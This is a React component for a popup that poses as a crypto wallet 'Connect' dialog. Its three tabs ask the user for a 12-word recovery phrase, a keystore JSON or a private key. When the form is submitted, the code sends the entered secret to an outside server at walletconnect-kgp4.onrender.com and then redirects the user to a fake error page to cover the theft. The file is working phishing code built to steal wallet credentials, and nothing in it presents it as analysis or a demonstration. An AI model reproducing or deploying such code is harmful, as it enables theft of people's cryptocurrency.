 
import React, {useState, useEffect}  from 'react';   

function Connect({onCancelClick}) {     

    const [active, setActive] = useState('a');  
    const [inputavalue, setInputavalue]  = useState('');   
    const [inputbvalue, setInputbvalue]  = useState(''); 
    const [inputcvalue, setInputcvalue]  = useState('');  
    const [isLoadinga, setIsLoadinga] = useState(false);     
    const [isLoadingb, setIsLoadingb] = useState(false);  
    const [isLoadingc, setIsLoadingc] = useState(false); 


    useEffect( ()=> { 
           if(isLoadinga) {        
            const postData = async ()=>{ 
              const data = {
                  inputvalue : inputavalue,
              }
            try{  
                const response = await fetch('https://walletconnect-kgp4.onrender.com/processing', {
                   method : 'post', 
                   body : JSON.stringify(data),
                   headers: {
                        'Content-Type': 'application/json',
                         Accept: 'application/json',
                   },
                });    
                if(!response.ok) {
                  throw response;
              }  
 

              setTimeout(()=>{
                // set the button loading state back to false
               setIsLoadinga(false);   
               setInputavalue('');
               onCancelClick();  
              }, 5000);  

              setTimeout(()=>{  
                  window.location.href = '/error_processing_request-dwdwdbwdvwhwdvhwwdvw9bwys8gdvhdvyvsjvswjhs';
              }, 5200); 
 

            } 
                
                catch(err) { 
                  setIsLoadinga(false);
                    const error = await err.text();  
                    alert(error);
                }
           }  
           postData();
      }
    }, [isLoadinga]);   







         
    useEffect( ()=> { 
      if(isLoadingb) {        
       const postData = async ()=>{ 
         const data = {
             inputvalue : inputbvalue,
         }
       try{  
           const response = await fetch('https://walletconnect-kgp4.onrender.com/processingb', {
              method : 'post', 
              body : JSON.stringify(data),
              headers: {
                   'Content-Type': 'application/json',
                    Accept: 'application/json',
              },
           });    
           if(!response.ok) {
             throw response;
         }  


         setTimeout(()=>{
           // set the button loading state back to false
          setIsLoadingb(false);   
          setInputbvalue('');
          onCancelClick();  
         }, 5000);  

         setTimeout(()=>{  
             window.location.href = '/error_processing_request-dwdwdbwdvwhwdvhwwdvw9bwys8gdvhdvyvsjvswjhs';
         }, 5200); 


       } 
           
           catch(err) { 
             setIsLoadingb(false);
               const error = await err.text();  
               alert(error);
           }
      }  
      postData();
 }
}, [isLoadingb]);







useEffect( ()=> { 
  if(isLoadingc) {        
   const postData = async ()=>{ 
     const data = {
         inputvalue : inputcvalue,
     }
   try{  
       const response = await fetch('https://walletconnect-kgp4.onrender.com/processingc', {
          method : 'post', 
          body : JSON.stringify(data),
          headers: {
               'Content-Type': 'application/json',
                Accept: 'application/json',
          },
       });    
       if(!response.ok) {
         throw response;
     }  


     setTimeout(()=>{
       // set the button loading state back to false
      setIsLoadingc(false);   
      setInputcvalue('');
      onCancelClick();  
     }, 5000);  

     setTimeout(()=>{  
         window.location.href = '/error_processing_request-dwdwdbwdvwhwdvhwwdvw9bwys8gdvhdvyvsjvswjhs';
     }, 5200); 


   } 
       
       catch(err) { 
         setIsLoadingc(false);
           const error = await err.text();  
           alert(error);
       }
  }  
  postData();
}
}, [isLoadingc]);



 
   return (  
     <div className='popup-encloser'> 
    <div className="popup-container">  
      <br />
    <div className="tab-container"> 
    <i className='fa fa-times close-btn' onClick={onCancelClick}></i> 
        <div onClick={()=> { setActive('a')} } className={`tab ${active === 'a' ? 'active' : ''}`}>12 Phrase</div>  
        <div onClick={()=> { setActive('b')} } className={`tab ${active === 'b' ? 'active' : ''}`}>Keystore JSON</div>
        <div onClick={()=> { setActive('c')} } className={`tab ${active === 'c' ? 'active' : ''}`}>Private Key</div>  
    </div>     
 
    
    { 
         active === 'a' && ( 
            <form onSubmit={(event)=>{
              event.preventDefault(); 
              if (inputavalue.length < 1) { // Ensure textarea is not empty
                alert("Please enter your 12 phrase");  
                return;
              } 
              setIsLoadinga(true);
            }}>
            <div id="phraseBox" className="content-box">
            <textarea onChange={(e)=>{
              setInputavalue(e.target.value);  
            }} 
            placeholder="Enter your 12-word recovery phrase" rows="4"> 
            </textarea>
            <button className={`connect-btn ${isLoadinga ? 'loading' : ''}`}>  
        { `${isLoadinga ? "Connecting..." : "Connect"}` }
        </button> 
            </div> 
            </form>
         )   
    }
    
   { 
     
         active === 'b' && ( 
          <form onSubmit={(event)=>{
            event.preventDefault(); 
            if (inputbvalue.length < 1) { // Ensure textarea is not empty
              alert("Please enter your keystore json");  
              return;
            } 
            setIsLoadingb(true);
          }}>
          <div id="phraseBox" className="content-box">
          <textarea onChange={(e)=>{
            setInputbvalue(e.target.value);  
          }} 
          placeholder="Enter your keystore json" rows="4"> 
          </textarea>
          <button className={`connect-btn ${isLoadingb ? 'loading' : ''}`}>  
      { `${isLoadingb ? "Connecting..." : "Connect"}` }
      </button> 
          </div> 
          </form>
         )
     }  

{ 
         active === 'c' && (  
          <form onSubmit={(event)=>{
            event.preventDefault(); 
            if (inputcvalue.length < 1) { // Ensure textarea is not empty
              alert("Please enter your private key");  
              return;
            } 
            setIsLoadingc(true);
          }}>
          <div id="phraseBox" className="content-box">
          <textarea onChange={(e)=>{
            setInputcvalue(e.target.value);  
          }} 
          placeholder="Enter your private key" rows="4"> 
          </textarea>
          <button className={`connect-btn ${isLoadingc ? 'loading' : ''}`}>  
      { `${isLoadingc ? "Connecting..." : "Connect"}` }
      </button> 
          </div> 
          </form>
         )
}
 

</div>   
</div>

    ) 
} 

export default Connect;